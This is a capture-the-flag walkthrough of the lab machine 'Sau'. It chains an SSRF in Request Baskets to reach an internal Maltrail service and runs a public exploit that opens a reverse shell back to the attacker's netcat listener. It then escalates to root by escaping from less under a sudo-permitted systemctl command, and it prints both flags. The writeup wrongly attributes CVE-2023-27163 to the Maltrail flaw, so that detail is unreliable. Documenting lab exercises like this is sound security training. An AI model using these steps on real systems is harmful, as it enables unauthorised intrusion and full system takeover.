
## CTF Writeup: Sau

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.229.26             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 09:48 -0500
Nmap scan report for 10.129.229.26
Host is up (0.030s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open     http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 25 Sep 2026 14:51:00 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 25 Sep 2026 14:50:44 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 25 Sep 2026 14:50:44 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.99%I=7%D=9/25%Time=6AB68A44%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2025\x20Sep\x20
SF:2026\x2014:50:44\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2025\x20Sep\x20
SF:2026\x2014:50:44\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Fri,\x2025\x20Sep\x202026\x2
SF:014:51:00\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20n
SF:ame;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\
SF:-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan
SF:,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host
SF:\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Ho
SF:st\x20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.68 seconds
```

The TCP Scan reveals an webserver running on port 55555 and SSH being open. Let's inspect the webserver.

Upon inspecting the webservice running on port 55555, we get greeted with an application called "Request Baskets". It also provided us with version information about the service "1.2.1". 

The Web Application allowed me to create an so called basket, which allowed me to handle http requests. I generated one, navigated to it and pressed on settings. There I could select where this package get's forwarded to. I selected my local machine ip to see if SSRF could be possible!

Started up netcat listener.

```
nc -lvnp 80
```

and proceeded with curling the basket. 

```
curl http://10.129.229.26:55555/uzwn2xv
```

As we can see from the response, we were successfully sending the http package. But the issue is it's not showing the complete output.

```
nc -lvnp 80                                     
listening on [any] 80 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.229.26] 58868
GET / HTTP/1.1
Host: 10.10.14.57
User-Agent: curl/8.21.0
Accept: */*
X-Do-Not-Forward: 1
Accept-Encoding: gzip
```

In the settings was also an proxy functionality, I selected it and resend the curl request. This time it hanged, because of the proxy functionality. To check if we have SSRF I prompted "whoami" inside the network package and boom! We were  actually able to manipulate the http package in the proxy.

```
nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.229.26] 44542
GET / HTTP/1.1
Host: 10.10.14.57
User-Agent: curl/8.21.0
Accept: */*
X-Do-Not-Forward: 1
Accept-Encoding: gzip

whoami
```

Response:

```
curl http://10.129.229.26:55555/uzwn2xv
Failed to forward request: Get http://10.10.14.57: net/http: HTTP/1.x transport connection broken: malformed HTTP response "whoami"
```

Since SSRF is working, we could potentially check stuff running internally by chosing an forward on the loopback ip address.

So I changed the forward URL to http://127.0.0.1 and send another curl request and received an interesting webpage (port 80).

```
curl http://10.129.229.26:55555/uzwn2xv
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html;charset=utf8">
        <meta name="viewport" content="width=device-width, user-scalable=no">
        <meta name="robots" content="noindex, nofollow">
        <title>Maltrail</title>
        <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <link rel="stylesheet" type="text/css" href="css/media.css">
        <script type="text/javascript" src="js/errorhandler.js"></script>
        <script type="text/javascript" src="js/thirdparty.min.js"></script>
        <script type="text/javascript" src="js/papaparse.min.js"></script>
    </head>
    <body>
        <div id="header_container" class="header noselect">
            <div id="logo_container">
                <span id="logo"><img src="images/mlogo.png" style="width: 25px">altrail</span>
            </div>
            <div id="calendar_container">
                <center><span id="spanToggleHeatmap" style="cursor: pointer"><a class="header-a header-period" id="period_label"></a><img src="images/calendar.png" style="width: 25px; height: 25px; vertical-align: top"></span></center>
            </div>
            <ul id="link_container">
                <li class="header-li"><a class="header-a" href="https://github.com/stamparm/maltrail/blob/master/README.md" id="documentation_link" target="_blank">Documentation</a></li>
                <li class="header-li link-splitter">|</li>
                <li class="header-li"><a class="header-a" href="https://github.com/stamparm/maltrail/wiki" id="wiki_link" target="_blank">Wiki</a></li>
                <li class="header-li link-splitter">|</li>
<!--                <li class="header-li"><a class="header-a" href="https://docs.google.com/spreadsheets/d/1lJfIa1jPZ-Vue5QkQACLaAijBNjgRYluPCghCVBMtHI/edit" id="collaboration_link" target="_blank">Collaboration</a></li>
                <li class="header-li link-splitter">|</li>-->
                <li class="header-li"><a class="header-a" href="https://github.com/stamparm/maltrail/issues/" id="issues_link" target="_blank">Issues</a></li>
                <li class="header-li link-splitter hidden" id="login_splitter">|</li>
                <li class="header-li"><a class="header-a hidden" id="login_link">Log In</a></li>
                <li class="header-li"></li>
            </ul>
        </div>

        <div id="heatmap_container" class="container hidden" style="text-align: center">
            <div>
                <button id="heatmap-previous" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" type="button" role="button">
                    <span class="ui-icon ui-icon-carat-1-w"></span>
                </button>
                <button id="heatmap-next" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" type="button" role="button">
                    <span class="ui-icon ui-icon-carat-1-e"></span>
                </button>
            </div>

            <div style="display: inline-block; float: top; vertical-align: top; margin-top: 5px">
                <div id="cal-heatmap" style="display: inline-block"></div>
            </div>
        </div>

        <div id="main_container" class="container hidden">
            <div id="status_container" style="width: 100%; text-align: center">
                <div>
                    <ul style="list-style: outside none none; overflow: hidden; font-family: sans-serif; padding: 0px; display: inline-block; white-space: nowrap">
                        <li id="btnDrawThreats" class="status-button noselect" style="background: rgb(31, 119, 180); background: radial-gradient(rgb(174, 199, 232) 0%, rgb(31, 119, 180) 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)" title="Threats">
                            <h4 id="threats_count">-</h4>
                            <span class="dynamicsparkline" id="threats_sparkline"></span>
                            <h6>Threats</h6>
                        </li>
                        <li id="btnDrawEvents" class="status-button noselect" style="background: rgb(255, 127, 14); background: radial-gradient(rgb(255, 187, 120) 0%, rgb(255, 127, 14) 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)" title="Events">
                            <h4 id="events_count">-</h4>
                            <span class="dynamicsparkline" id="events_sparkline"></span>
                            <h6>Events</h6>
                        </li>
                        <li id="btnDrawSeverity" class="status-button noselect" style="background: rgb(44, 160, 44); background: radial-gradient(rgb(152, 223, 138) 0%, rgb(44, 160, 44) 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)" title="Severity">
                            <h4 id="severity_count">-</h4>
                            <span class="dynamicsparkline" id="severity_sparkline"></span>
                            <h6>Severity</h6>
                        </li>
                        <li id="btnDrawSources" class="status-button noselect" style="background:rgb(214, 39, 40); background: radial-gradient(rgb(255, 152, 150) 0%, rgb(214, 39, 40) 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)" title="Sources">
                            <h4 id="sources_count">-</h4>
                            <span class="dynamicsparkline" id="sources_sparkline"></span>
                            <h6>Sources</h6>
                        </li>
                        <li id="btnDrawTrails" class="status-button noselect" style="background:rgb(148, 103, 189); background: radial-gradient(rgb(197, 176, 213) 0%, rgb(148, 103, 189) 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)" title="Trails">
                            <h4 id="trails_count">-</h4>
                            <span class="dynamicsparkline" id="trails_sparkline"></span>
                            <h6>Trails</h6>
                        </li>
                    </ul>
                </div>
                <div>
                    <!--<label>title</label>-->
                    <img id="graph_close" src="images/close.png" class="hidden" title="close">
                </div>
                <div id="chart_area">
                </div>
            </div>

            <table width="100%" border="1" cellpadding="2" cellspacing="0" class="display compact" id="details">
            </table>
        </div>

        <noscript>
            <div id="noscript">
                Javascript is disabled in your browser. You must have Javascript enabled to utilize the functionality of this page.
            </div>
        </noscript>

        <div id="bottom_blank"></div>
        <div class="bottom noselect">Powered by <b>M</b>altrail (v<b>0.53</b>)</div>

        <ul class="custom-menu">
            <li data-action="hide_threat">Hide threat</li>
            <li data-action="report_false_positive">Report false positive</li>
        </ul>
        <script defer type="text/javascript" src="js/main.js"></script>
    </body>
</html>
```

Upon accessing the following URL in the browser, we can actually see the website now.

```
http://10.129.229.26:55555/uzwn2xv
```

Since a lot of the stuff doesn't get properly loaded the website looks very unfinished. But scrolling down to the bottom of the webpage it reveals the version information of "Maltrail (v0.53)". Searching for public exploits immediatly follows: CVE-2023-27163. Apparently the /login endpoint grants command execution in the "username" parameter.

Since the proxy only loaded some of the artifcats of the original webpage, I decided to go back to the Request Basket Applications --> Settings and then modify the Forward URL Parameter to the login endpoint directly:

```
http://127.0.0.1/login
```

Now we should have the vulnerable login endpoint.

I then utilized the following exploit:

```
https://github.com/spookier/Maltrail-v0.53-Exploit
```

Started up my listener on port 443 on my local machine.

```
nc -lvnp 443
```

Ran the exploit.

```
python3 exploit.py 10.10.14.57 443 http://10.129.229.26:55555/uzwn2xv
```

And gained RCE as user "puma".

```
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.229.26] 56362
$ whoami
whoami
puma
$
```

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Retrieved user.txt in /home/puma directory.

```
832b3986d134f05b83743731422da992
```
## Privilege Escalation

Enumerated user puma's sudo permissions and identified that he can run the systemctl binary specifically status on trail.service with sudo permissions and no password authentication needed.

```
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

We could potentially leverage this if we have write permissions on trail.service. Let's check!

```
find / -iname "trail.service" 2>/dev/null
/sys/fs/cgroup/memory/system.slice/trail.service
/sys/fs/cgroup/pids/system.slice/trail.service
/sys/fs/cgroup/devices/system.slice/trail.service
/sys/fs/cgroup/systemd/system.slice/trail.service
/sys/fs/cgroup/unified/system.slice/trail.service
/etc/systemd/system/trail.service
/etc/systemd/system/multi-user.target.wants/trail.service
```

This is not the case unfortunately.

```
ls -la /etc/systemd/system/trail.service
-rwxr-xr-x 1 root root 461 Apr 15  2023 /etc/systemd/system/trail.service
```

Let's execute the sudo permission actually to just see what happens. This was interesting it actually forwarded us into "less", from experience I know how to privesc from that by simply ending the less session with ! and then adding the bash binary behind it. Since the less session got opened with sudo permissions we'll get an bash session as root user.

```
sudo /usr/bin/systemctl status trail.service
!/bin/bash
```

Gained shell as root and retrieved root.txt in /root directory.

```
6c481a3a2a1bb8744642ef8ffa67c3a2
```